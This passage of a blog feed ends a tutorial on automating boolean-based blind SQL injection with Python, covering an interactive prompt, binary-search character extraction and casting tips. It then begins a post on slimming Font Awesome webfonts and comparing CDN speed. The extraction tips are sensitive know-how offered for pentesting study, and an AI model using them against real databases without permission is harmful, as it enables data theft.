+&lt;p&gt;Instead of modifying the shell command on each SQL change, it would be nice to have an interactive, shell-like program for running SQL statements. Throwing &lt;code&gt;input()&lt;/code&gt; in a while-loop could work, but doesn&#39;t have the usual shortcuts (e.g. up for previous command&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#fn4&quot; id=&quot;fnref4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;). To have a nicer, cross-platform terminal interface, we can use:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/prompt-toolkit/python-prompt-toolkit&quot;&gt;&lt;code&gt;prompt_toolkit&lt;/code&gt;&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;Has the usual terminal shortcuts: up, down, reverse search &lt;code&gt;^r&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Command history can be stored in a file so that it persists across runs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The implementation is as simple as replacing &lt;code&gt;input()&lt;/code&gt; with &lt;code&gt;prompt.prompt()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Before:&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;sql &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sqli&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;After:&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-python&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;prompt &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; PromptSession&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;history&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;FileHistory&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;.history&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+sql &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; prompt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;prompt&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sqli&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;h2 id=&quot;conclusion&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#conclusion&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Conclusion&lt;/h2&gt;
+&lt;p&gt;In this post, we introduced Boolean-Based Blind SQL injection, how it can be used to enumerate a database, and some optimisations and workarounds for exfiltrating data more reliably. We also explored some useful Python libraries to glue onto your project.&lt;/p&gt;
+&lt;p&gt;Automation and scripting can be a powerful time saver when the need exists. We identified a tedious task — brute forcing characters for possibly long strings — and followed up with incremental changes. Hopefully the reader has picked up a few tips on automation.&lt;/p&gt;
+&lt;hr class=&quot;footnotes-sep&quot; /&gt;
+&lt;b&gt;Footnotes&lt;/b&gt;
+&lt;section class=&quot;footnotes&quot;&gt;
+&lt;ol class=&quot;footnotes-list&quot;&gt;
+&lt;li id=&quot;fn1&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;Unicode characters are trickier to deal with. One possible way is to cast the number on the RHS with &lt;code&gt;CHAR&lt;/code&gt;. (This is the method SQLmap uses.) Another possible way in MySQL is to use &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_ord&quot;&gt;&lt;code&gt;ord&lt;/code&gt;&lt;/a&gt;, which maps multibyte characters to base-256. Character encoding is hard. :( &lt;a href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#fnref1&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn2&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;Full code for the Flask + SQLite demo is &lt;a href=&quot;https://github.com/TrebledJ/bsqli.py/blob/89e06c708d8a3be4afca6efcddff69097934d0df/demo/server.py&quot;&gt;uploaded on GitHub&lt;/a&gt; for reference. &lt;a href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#fnref2&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn3&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;This should make sense in bit terms. We only need 7 queries to figure out the 7 bits of an ASCII character. (The first bit is assumed to be 0.) Most Boolean-Based SQLi throwaway scripts don&#39;t do binary search because the algorithm is tricky to get right. But it&#39;s useful to know, and can be applied to time-based SQLi (another type of blind SQLi) as well for massive time discounts. &lt;a href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#fnref3&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn4&quot; class=&quot;footnote-item&quot;&gt;&lt;p&gt;Although in Windows, this appears to be built-in?! At least Windows or Python on Windows does one thing well. 🤷‍♂️ &lt;a href=&quot;https://trebledj.me/posts/automating-boolean-sql-injection-with-python/#fnref4&quot; class=&quot;footnote-backref&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</content>
+        
+          <category>infosec</category>
+        
+          <category>sql</category>
+        
+          <category>python</category>
+        
+          <category>web</category>
+        
+          <category>programming</category>
+        
+          <category>project</category>
+        
+          <category>writeup</category>
+        
+          <category>tutorial</category>
+        
+          <category>pentesting</category>
+        
+      </entry>
+    
+  
+    
+      
+      <entry>
+        <title>Optimising Web Icons for Fun</title>
+        <description>Ejecting unused cargo for leaner performance.</description>
+        <link href="https://trebledj.me/posts/optimising-web-icons-for-fun/"/>
+        <updated>2024-05-23T00:00:00Z</updated>
+        <id>https://trebledj.me/posts/optimising-web-icons-for-fun/</id>
+        <content xml:lang="en" type="html">&lt;p&gt;I decided to spend this Labour Day doing a bit of frontend performance engineering, learning Typescript along the way. I&#39;ve been eyeing my Font Awesome (FA) assets for a while, and lately they&#39;ve been a curious itch.&lt;/p&gt;
+&lt;p&gt;Here’s the dealio: icon webfonts are known to bundle &lt;em&gt;all&lt;/em&gt; icons. This includes icons we don&#39;t use. For Font Awesome, this means the browser downloads 19kB CSS + 287kB WOFF2 gzipped data. But my site just uses 40 out of 2000… why download so much?&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fn1&quot; id=&quot;fnref1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;I present you the heaviest objects in the universe: Font Files.&quot; href=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/fonts-are-pretty-heavy-612w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-50&quot; src=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/fonts-are-pretty-heavy-612w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 612 / 408&quot; alt=&quot;I present you the heaviest objects in the universe: Font Files.&quot; title=&quot;I present you the heaviest objects in the universe: Font Files.&quot; srcset=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/fonts-are-pretty-heavy-256w.webp 256w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/fonts-are-pretty-heavy-512w.webp 512w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/fonts-are-pretty-heavy-612w.webp 612w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 612px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I should take a step back. There are generally two established ways to handle icons on the web: 1) webfonts (plus CSS), and 2) inline SVGs (Scalable Vector Graphics). As its name suggests, SVGs scale nicely to any screen size and remove the need for font files. Both have their &lt;a href=&quot;https://blog.fontawesome.com/webfont-vs-svg/&quot;&gt;use cases&lt;/a&gt;, but the modern web recommends SVGs for general cases.&lt;/p&gt;
+&lt;p&gt;Due to historical reasons, this site uses webfonts; and unfortunately, replacing webfonts with SVGs is not a simple &lt;em&gt;find-and-replace&lt;/em&gt;. If it were, I would&#39;ve included it in this analysis. After a painful struggle migrating a few icons, I decided to postpone migration. Didn&#39;t really feel like tuning CSS.&lt;/p&gt;
+&lt;p&gt;So I turned my attention to slimming down webfonts like Garfield doing cardio. But before I explain the process, let&#39;s understand how icon webfonts work.&lt;/p&gt;
+&lt;h2 id=&quot;icon-webfonts-under-the-hood&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#icon-webfonts-under-the-hood&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Icon Webfonts Under the Hood &lt;i class=&quot;fa-brands fa-redhat&quot;&gt;&lt;/i&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;fonts-and-unicode&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fonts-and-unicode&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Fonts and Unicode &lt;i class=&quot;fa-regular fa-face-smile&quot;&gt;&lt;/i&gt;&lt;/h3&gt;
+&lt;p&gt;There are various font formats: WOFF, TrueType, OpenType. These are essentially different ways to compress and store fonts. WOFF2, for instance, is a modern compression format optimised for the web.&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fn2&quot; id=&quot;fnref2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;Ultimately, fonts are mappings from integer codepoints to glyphs. These codepoints are standardised by the &lt;a href=&quot;https://www.unicode.org/standard/standard.html&quot;&gt;Unicode Standard&lt;/a&gt; and are expressed in the format &lt;code&gt;U+[0-9A-F]{4,6}&lt;/code&gt;, i.e. “U+” followed by 4-6 hexadecimal digits. For example, the number U+0030 maps to &amp;quot;0&amp;quot;, and U+0041 maps to &amp;quot;A&amp;quot;, U+2206 maps to &amp;quot;∆&amp;quot; (delta), and U+6C34 maps to &amp;quot;水&amp;quot;.&lt;/p&gt;
+&lt;div class=&quot;alert alert-warning d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-triangle-exclamation ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;p&gt;Codepoints are &lt;em&gt;not&lt;/em&gt; to be confused with UTF-8, UTF-16, and UTF-32, which are different ways to efficiently store Unicode characters in byte format.&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;You may be wondering: so what codepoints map to icons? This is up to icon packs to define. Since most icons are custom by nature, they&#39;re usually placed in custom regions known as Private Use Areas, reserved by the Unicode Standard. One such region is U+E000 – U+F8FF.&lt;/p&gt;
+&lt;h3 id=&quot;fonts-and-css&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fonts-and-css&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Fonts and CSS &lt;i class=&quot;fa-brands fa-css3-alt&quot;&gt;&lt;/i&gt;&lt;/h3&gt;
+&lt;p&gt;For webfonts to work, codepoints need to exist in the HTML text. But that&#39;s terribly inconvenient — writing magic numbers makes for hard-to-maintain code.&lt;/p&gt;
+&lt;p&gt;This is where CSS comes in. Specialised CSS rules connect the HTML code to the exact font glyph via a two-step process: 1) identifying the font file and 2) identifying the codepoint. Once the browser has these two pieces of information, it can render the glyph.&lt;/p&gt;
+&lt;p&gt;Suppose we write the following HTML code:&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre data-lang-off=&quot;&quot; class=&quot;language-html&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;i&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;fas fa-rocket&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;i&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;The font file is determined by matching the assigned font with the custom font face. The &lt;code&gt;fas&lt;/code&gt; class is key here.&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre class=&quot;language-css&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;&lt;span class=&quot;token selector&quot;&gt;.fas&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Font Awesome 6 Free&quot;&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;font-style&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; normal&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;font-weight&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 900&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;token atrule&quot;&gt;&lt;span class=&quot;token rule&quot;&gt;@font-face&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Font Awesome 6 Free&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;font-style&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; normal&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;font-weight&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 900&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;font-display&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; block&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token url&quot;&gt;&lt;span class=&quot;token function&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;../webfonts/fa-solid-900.woff2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;woff2&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token url&quot;&gt;&lt;span class=&quot;token function&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;../webfonts/fa-solid-900.ttf&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;truetype&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;span class=&quot;lang&quot;&gt;CSS&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The codepoint is inserted with a &lt;code&gt;:before&lt;/code&gt; pseudo-element. For &lt;code&gt;fa-rocket&lt;/code&gt;, this is U+F135.&lt;/p&gt;
+&lt;div class=&quot;code-toolbar&quot;&gt;&lt;pre class=&quot;language-css&quot; tabindex=&quot;0&quot;&gt;&lt;code class=&quot;language-css&quot;&gt;&lt;span class=&quot;token selector&quot;&gt;.fa-rocket:before&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&#92;f135&quot;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&quot;toolbar&quot;&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;span class=&quot;lang&quot;&gt;CSS&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;toolbar-item&quot;&gt;&lt;button class=&quot;copy-to-clipboard-button&quot; type=&quot;button&quot; title=&quot;Copy Code&quot;&gt;&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;It&#39;s a lot of indirection, and this is one reason why SVGs are preferred; but hey, this was the gold standard a decade ago.&lt;/p&gt;
+&lt;h3 id=&quot;multiple-variants&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#multiple-variants&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Multiple Variants &lt;i class=&quot;fas fa-circle&quot;&gt;&lt;/i&gt; &lt;i class=&quot;far fa-circle&quot;&gt;&lt;/i&gt;&lt;/h3&gt;
+&lt;p&gt;To complicate matters, FA fonts have different &lt;strong&gt;variants&lt;/strong&gt;, and they modularise this by using the same codepoint, but separate font files. Not all fonts do this though. Devicon packs all their styles into a single font file. Here are some examples of FA styles.&lt;/p&gt;
+&lt;div class=&quot;table-container icon-table&quot;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;Solid&lt;/th&gt;
+&lt;th&gt;Regular&lt;/th&gt;
+&lt;th&gt;Brands&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;fa-star&lt;/code&gt; (U+F005)&lt;/td&gt;
+&lt;td&gt;&lt;i class=&quot;fs-4 fas fa-star&quot;&gt;&lt;/i&gt;&lt;/td&gt;
+&lt;td&gt;&lt;i class=&quot;fs-4 far fa-star&quot;&gt;&lt;/i&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;fa-user&lt;/code&gt; (U+F007)&lt;/td&gt;
+&lt;td&gt;&lt;i class=&quot;fs-4 fas fa-user&quot;&gt;&lt;/i&gt;&lt;/td&gt;
+&lt;td&gt;&lt;i class=&quot;fs-4 far fa-user&quot;&gt;&lt;/i&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;fa-thumbs-up&lt;/code&gt; (U+F164)&lt;/td&gt;
+&lt;td&gt;&lt;i class=&quot;fs-4 fas fa-thumbs-up&quot;&gt;&lt;/i&gt;&lt;/td&gt;
+&lt;td&gt;&lt;i class=&quot;fs-4 far fa-thumbs-up&quot;&gt;&lt;/i&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;fa-github&lt;/code&gt; (U+F09B)&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;i class=&quot;fs-4 fab fa-github&quot;&gt;&lt;/i&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;h2 id=&quot;an-icon-dieting-plan&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#an-icon-dieting-plan&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; An Icon Dieting Plan &lt;i class=&quot;fa-solid fa-dumbbell&quot;&gt;&lt;/i&gt;&lt;/h2&gt;
+&lt;p&gt;With the backstory out of the way, let&#39;s discuss the high-level algorithm.&lt;/p&gt;
+&lt;p&gt;In my mind, all we have to do is post-process the generated static files like so:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Crawl the HTML files for a Font Awesome CSS. Parse the CSS and associated WOFF2 font files.&lt;/li&gt;
+&lt;li&gt;Crawl the HTML files (and perhaps other files) for used icons.&lt;/li&gt;
+&lt;li&gt;Construct a font file containing the minimum icons. We may also need to remap codepoints to resolve clashes.&lt;/li&gt;
+&lt;li&gt;Construct a CSS file containing the new mappings from icon class (e.g. &lt;code&gt;.fa-star&lt;/code&gt;) to codepoint.&lt;/li&gt;
+&lt;li&gt;Write the CSS and font files.&lt;/li&gt;
+&lt;li&gt;Replace the original CSS links with the new CSS file.&lt;/li&gt;
+&lt;li&gt;Celebrate!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To no one&#39;s surprise, this shaved off more than 97% bytes. A success! Or is it?&lt;/p&gt;
+&lt;h2 id=&quot;where-speed&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#where-speed&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Where speed? &lt;i class=&quot;fa-solid fa-poo&quot;&gt;&lt;/i&gt;&lt;/h2&gt;
+&lt;p&gt;As with many things in engineering, one metric rarely provides good coverage.&lt;/p&gt;
+&lt;p&gt;After integrating the minification into my build process, I excitedly waited for the site to build. I opened Chrome dev tools, loaded my site, and... what?! It was slower? Okay, maybe it was the first load, and the page wasn&#39;t cached on the edge.&lt;/p&gt;
+&lt;p&gt;But even after refreshing multiple times, the &lt;strong&gt;Time to First Byte (TTFB)&lt;/strong&gt; was roughly the same compared to loading the original files.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Server - why u no fast?&quot; href=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/y-server-no-fast-500w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-60&quot; src=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/y-server-no-fast-500w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 500 / 500&quot; alt=&quot;Server - why u no fast?&quot; title=&quot;Server - why u no fast?&quot; srcset=&quot;https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/y-server-no-fast-256w.webp 256w, https://trebledj.me/img/posts/programming/mini-projects/optimising-web-icons/assets/y-server-no-fast-500w.webp 500w&quot; sizes=&quot;(max-width: 256px) 256px, 500px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The answer? CDN.&lt;/p&gt;
+&lt;div class=&quot;alert alert-success d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-lightbulb ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;p&gt;What is a CDN? CDNs (Content Delivery Networks) are servers deployed all over the globe, optimised to deliver assets such as JS, CSS, images, and fonts.&lt;/p&gt;
+&lt;p&gt;Moreover, if the file is guaranteed to &lt;em&gt;not&lt;/em&gt; change (e.g. a versioned library asset), then the server can return a high browser cache duration, typically 1 year. Subsequent requests can just reuse the downloaded file.&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The &lt;a href=&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css&quot;&gt;original&lt;/a&gt; &lt;a href=&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/webfonts/fa-solid-900.woff2&quot;&gt;files&lt;/a&gt; are delivered over a CDN. On the other hand, the minified files are served from Cloudflare Pages, which aren&#39;t optimised for low-latency delivery. Further, CF Pages may modify the URL/request/response via Page Rules or Cache Rules, and this extra server-side processing takes a toll on the response speed.&lt;/p&gt;
+&lt;p&gt;I benchmarked the response speed of delivery by CDN versus the site directory. The methodology is simple: collect download times from multiple points around the world, repeat this a couple times, and find the median. And we perform this for 6 different asset files.&lt;/p&gt;
+&lt;p&gt;Turns out, cdnjs.cloudflare.com delivers almost 50% faster.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Asset&lt;/th&gt;
+&lt;th&gt;Total Time (in ms)&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fn3&quot; id=&quot;fnref3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;/th&gt;
+&lt;th&gt;Total Time x3 (in ms)&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;https://trebledj.me/posts/optimising-web-icons-for-fun/#fn4&quot; id=&quot;fnref4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;CSS (cdn; unminified)&lt;/td&gt;
+&lt;td&gt;17&lt;/td&gt;
+&lt;td&gt;-&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;CSS (site; unminified)&lt;/td&gt;
+&lt;td&gt;29&lt;/td&gt;
+&lt;td&gt;-&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;CSS (site; minified)&lt;/td&gt;
+&lt;td&gt;29&lt;/td&gt;
+&lt;td&gt;-&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
